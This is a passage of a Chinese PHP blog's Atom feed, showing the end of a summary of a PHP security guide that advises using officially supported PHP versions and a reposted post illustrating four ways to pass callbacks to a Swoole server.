&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。&lt;/p&gt;
&lt;p&gt;这个指南应该以重点部分作为 &lt;a href=&quot;https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F&quot;&gt;PHP: The Right Way&lt;/a&gt; 安全章节的补充，而不是以一般的 PHP 编程话题。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;h2 id=&quot;PHP-版本&quot;&gt;&lt;a href=&quot;#PHP-版本&quot; class=&quot;headerlink&quot; title=&quot;PHP 版本&quot;&gt;&lt;/a&gt;PHP 版本&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;PHP 7.2 已于 2017 年 11 月 30 日发布。&lt;/p&gt;
&lt;p&gt;写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。&lt;/p&gt;
&lt;p&gt;对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。&lt;/p&gt;
&lt;p&gt;因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用&lt;a href=&quot;https://link.juejin.im/?target=http%3A%2F%2Fphp.net%2Fsupported-versions.php&quot;&gt;官方提供支持的 PHP 版本&lt;/a&gt;。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="security" scheme="http://www.twosee.cn/tags/security/"/>
    
      <category term="hack" scheme="http://www.twosee.cn/tags/hack/"/>
    
  </entry>
  
  <entry>
    <title>[转] 4种PHP回调函数</title>
    <link href="http://www.twosee.cn/2018/01/04/PHP-callback/"/>
    <id>http://www.twosee.cn/2018/01/04/PHP-callback/</id>
    <published>2018-01-03T21:47:33.000Z</published>
    <updated>2018-05-12T03:19:48.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以Swoole服务事件回调为例</p></blockquote><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($req, $resp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="类静态方法"><a href="#类静态方法" class="headerlink" title="类静态方法"></a>类静态方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="string">'A::Test'</span>);</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="keyword">array</span>(<span class="string">'A'</span>, <span class="string">'Test'</span>));</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_onRequest</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="string">'my_onRequest'</span>);</span><br></pre></td></tr></table></figure><h2 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> A();</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="keyword">array</span>($object, <span class="string">'test'</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以Swoole服务事件回调为例&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;匿名函数&quot;&gt;&lt;a href=&quot;#匿名函数&quot; class=&quot;headerlink&quot; title=&quot;匿名函数&quot;&gt;&lt;/a&gt;匿名函数&lt;/h2&gt;&lt;figure class=&quot;
      
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
  </entry>
  
</feed>
